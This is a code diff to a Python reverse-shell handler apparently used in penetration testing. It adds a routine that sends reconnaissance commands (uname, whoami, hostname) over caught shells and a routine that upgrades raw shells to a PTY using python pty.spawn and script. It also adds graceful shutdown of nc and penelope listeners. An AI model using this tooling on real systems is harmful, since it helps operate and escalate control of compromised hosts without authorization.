@@ -105,9 +105,139 @@ class ShellManager:
             return shell
 
     def _probe_shell(self, shell: Shell) -> None:
-        """Try to get OS/user info from shell"""
-        # This will be implemented based on shell type
-        pass
+        """Try to get OS/user info from shell by sending probe commands"""
+        if not shell.sock:
+            return
+
+        try:
+            # Brief delay to let shell initialize
+            time.sleep(0.3)
+
+            # Try Linux first (most common for reverse shells)
+            shell.sock.settimeout(2.0)
+            shell.sock.send(b"echo UWU_PROBE_START && uname -a && whoami && hostname && echo UWU_PROBE_END\n")
+            time.sleep(0.5)
+
+            data = b""
+            try:
+                while True:
+                    chunk = shell.sock.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                    if b"UWU_PROBE_END" in data:
+                        break
+            except (socket_module.timeout, BlockingIOError):
+                pass
+
+            output = data.decode("utf-8", errors="replace")
+
+            if "UWU_PROBE_START" in output and "UWU_PROBE_END" in output:
+                # Parse Linux output
+                probe_data = output.split("UWU_PROBE_START")[1].split("UWU_PROBE_END")[0].strip()
+                lines = [l.strip() for l in probe_data.split("\n") if l.strip()]
+                if len(lines) >= 1:
+                    shell.os_info = lines[0][:80]  # uname -a
+                if len(lines) >= 2:
+                    shell.user = lines[1]
+                if len(lines) >= 3:
+                    shell.hostname = lines[2]
+                return
+
+            # Try Windows if Linux probe failed
+            shell.sock.send(b"echo UWU_PROBE_START & whoami & hostname & echo UWU_PROBE_END\r\n")
+            time.sleep(0.5)
+
+            data = b""
+            try:
+                while True:
+                    chunk = shell.sock.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                    if b"UWU_PROBE_END" in data:
+                        break
+            except (socket_module.timeout, BlockingIOError):
+                pass
+
+            output = data.decode("utf-8", errors="replace")
+            if "UWU_PROBE_START" in output and "UWU_PROBE_END" in output:
+                probe_data = output.split("UWU_PROBE_START")[1].split("UWU_PROBE_END")[0].strip()
+                lines = [l.strip() for l in probe_data.split("\n") if l.strip()]
+                if len(lines) >= 1:
+                    shell.user = lines[0]
+                    shell.os_info = "Windows"
+                if len(lines) >= 2:
+                    shell.hostname = lines[1]
+
+        except Exception:
+            pass  # Probing is best-effort
+        finally:
+            try:
+                shell.sock.settimeout(None)
+                shell.sock.setblocking(True)
+            except Exception:
+                pass
+
+    def upgrade_shell(self, shell_id: int) -> bool:
+        """Attempt to upgrade a raw shell to a PTY"""
+        shell = self.get_shell(shell_id)
+        if not shell or not shell.sock:
+            return False
+
+        if shell.pty_fd is not None:
+            print(Style.warning("Shell already upgraded"))
+            return True
+
+        try:
+            # Try Python3 PTY spawn
+            upgrade_cmds = [
+                b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
+                b"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
+                b"script -qc /bin/bash /dev/null\n",
+            ]
+
+            for cmd in upgrade_cmds:
+                shell.sock.settimeout(2.0)
+                shell.sock.send(cmd)
+                time.sleep(1.0)
+
+                # Check if we got a proper prompt
+                try:
+                    data = shell.sock.recv(4096)
+                    output = data.decode("utf-8", errors="replace")
+                    if "$" in output or "#" in output or ">" in output:
+                        # Try to configure terminal
+                        shell.sock.send(b"export TERM=xterm-256color\n")
+                        time.sleep(0.2)
+
+                        # Get terminal size and set it
+                        try:
+                            import struct, fcntl, termios as _termios
+                            s = struct.pack('HHHH', 0, 0, 0, 0)
+                            result = fcntl.ioctl(sys.stdout.fileno(), _termios.TIOCGWINSZ, s)
+                            rows, cols = struct.unpack('HHHH', result)[:2]
+                            shell.sock.send(f"stty rows {rows} cols {cols}\n".encode())
+                            time.sleep(0.2)
+                        except Exception:
+                            pass
+
+                        print(Style.success(f"Shell {shell_id} upgraded to PTY"))
+                        return True
+                except (socket_module.timeout, BlockingIOError):
+                    continue
+
+            print(Style.warning("PTY upgrade failed - no Python/script available"))
+            return False
+
+        except Exception as e:
+            print(Style.error(f"Upgrade failed: {e}"))
+            return False
+        finally:
+            try:
+                shell.sock.settimeout(None)
+            except Exception:
+                pass
 
     def remove_shell(self, shell_id: int) -> bool:
         """Remove a shell by ID"""
@@ -470,12 +600,25 @@ class ShellManager:
         return True
 
     def shutdown(self) -> None:
-        """Shutdown all listeners and shells"""
+        """Shutdown all listeners and shells gracefully"""
         self._running = False
 
-        # Stop all listeners
+        # Stop all listeners - close sockets first
         for port in list(self.listeners.keys()):
+            try:
+                listener = self.listeners[port]
+                if listener["type"] == "nc" and "socket" in listener:
+                    listener["socket"].shutdown(socket_module.SHUT_RDWR)
+                elif listener["type"] == "penelope" and "process" in listener:
+                    listener["process"].terminate()
+            except Exception:
+                pass
             self.stop_listener(port)
+
+        # Wait for listener threads to finish
+        for port, thread in list(self._listener_threads.items()):
+            thread.join(timeout=2.0)
+        self._listener_threads.clear()
 
         # Cleanup all shells
         for shell_id in list(self.shells.keys()):
